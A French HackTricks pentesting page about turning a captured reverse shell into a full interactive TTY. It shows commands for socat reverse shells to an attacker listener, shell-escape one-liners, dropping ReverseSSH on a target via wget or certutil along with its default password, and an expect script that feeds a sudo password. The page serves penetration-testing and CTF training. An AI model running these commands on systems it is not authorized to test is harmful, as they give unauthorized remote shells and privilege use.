# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` répertorie les chemins des shells de connexion valides et est consulté par certains programmes ; ce fichier n'est pas une condition universelle pour allouer un PTY.<sup>[[3]](#references)[[4]](#references)</sup> Si un programme comme `pkexec` rejette `SHELL` avec `The value for the SHELL variable was not found in the /etc/shells file`, assurez-vous que le chemin exact du shell (par exemple, `/bin/bash`) apparaît dans `/etc/shells`.<sup>[[10]](#references)</sup> La séquence de récupération `CTRL+Z`/`fg` ci-dessous utilise le job control de Bash ; si le shell actuel n'est pas Bash, démarrez Bash avant d'utiliser cette séquence.<sup>[[7]](#references)</sup>

#### Python

La fonction `pty.spawn` démarre un programme connecté aux flux d'entrée, de sortie et d'erreur standard du processus actuel, ce qui fournit un pseudo-terminal à Bash dans cette session.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Vous pouvez obtenir le **nombre** de **lignes** et de **colonnes** en exécutant **`stty -a`** ; `-a` affiche tous les paramètres actuels du terminal. La sortie de la commande dépend du terminal ; utilisez donc les valeurs indiquées par la session actuelle.<sup>[[11]](#references)</sup>

#### script

L’utilitaire `script` enregistre une session de terminal ; ici, `/dev/null` ignore le typescript, `-q` supprime les messages de démarrage et de fin, et `-c` exécute Bash au lieu du shell par défaut.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Après l’une ou l’autre méthode PTY-spawn, suspendez la session Netcat et restaurez-la avec le mode raw local, puis configurez l’environnement et les dimensions du terminal distant :
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Le listener utilise le terminal actuel en mode raw avec l’écho local désactivé et accepte les connexions TCP sur le port 4444. La commande côté victime alloue un pty, joint stderr, crée une session, transmet SIGINT et applique des paramètres de terminal sane ; ajoutez `ctty` si le processus enfant a besoin d’un terminal de contrôle.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Lancer des shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (anciennes versions avec `--interactive`) : `!sh`

L'échappement Nmap dépend de la version : Nmap a supprimé son mode `--interactive` dans les versions ultérieures, donc `!sh` s'applique uniquement aux anciennes versions.<sup>[[13]](#references)</sup>

## ReverseSSH

Une méthode pratique pour obtenir un **interactive shell access**, ainsi que pour effectuer des **file transfers** et du **port forwarding**, consiste à déposer le serveur SSH lié statiquement [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sur la cible.<sup>[[1]](#references)</sup>

Voici un exemple pour `x86` avec le binaire du projet, publié et compressé avec UPX. Pour les autres architectures ou artefacts de release, utilisez la [page des releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) comme guide.<sup>[[1]](#references)</sup>

1. Préparez l'hôte local pour intercepter la connexion SSH entrante. En mode listener, `-l` active le listener et `-p 4444` sélectionne le port sur lequel il accepte la connexion de la cible.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Cible Linux. Transférez le même artefact `upx_reverse-sshx86` vers `/dev/shm/reverse-ssh` et rendez-le exécutable. Le paramètre `-p 4444` de la cible sélectionne le port d'écoute indiqué ci-dessus, et `kali@10.0.0.2` fournit le compte et l'hôte utilisés pour établir la connexion vers le serveur.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Cible Windows. Un PowerShell interactif complet nécessite Windows 10 build 17763 ; consultez le [README du projet](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
L’exemple Windows utilise `certutil` avec `-f -urlcache` ; Microsoft documente `-f` comme forçant la récupération d’une URL et précise que les paramètres disponibles varient selon la version. Vérifiez donc `certutil -?` si cette forme n’est pas disponible.<sup>[[12]](#references)</sup>

- Après la réussite de la connexion reverse, le listener en mode reverse de ReverseSSH se lie au port `8888` par défaut (ou à la valeur fournie avec `-b`), et les connexions entrantes acceptent n’importe quel nom d’utilisateur avec le mot de passe par défaut `letmeinbrudipls`. Le shell distant s’exécute avec les privilèges du compte ayant lancé `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) upgrade automatiquement les reverse shells Unix-like vers un PTY, redimensionne les terminaux Unix-like et journalise les interactions avec le shell ; pour les shells Windows, il fournit readline, mais pas de redimensionnement du terminal en temps réel.<sup>[[2]](#references)</sup>

Exécutez `penelope` pour écouter par défaut sur `0.0.0.0:4444` ; les shells Unix-like entrants peuvent alors être automatiquement mis à niveau et journalisés.<sup>[[2]](#references)</sup>

![Penelope gérant et mettant à niveau un shell entrant](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Pas de TTY

Si, pour une raison quelconque, vous ne pouvez pas obtenir un TTY complet, vous **pouvez tout de même interagir avec les programmes** qui attendent une saisie utilisateur. Dans l’exemple suivant, Expect lance `sudo`, attend son invite de mot de passe, envoie le mot de passe, puis rend le contrôle avec `interact` ; `sudo -S` lit son mot de passe depuis l’entrée standard. Utilisez cette méthode uniquement dans un lab autorisé et évitez de placer de véritables identifiants dans l’historique du shell ou les fichiers sources.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Serveur ssh lié statiquement avec fonctionnalité de reverse shell pour les CTF et autres](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Gestionnaire de shell qui automatise certaines tâches pour simplifier la vie](https://github.com/brightio/penelope)
- [3] [shells(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — documentation Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Manuel de référence Bash — contrôle des tâches](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Journal des modifications de Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
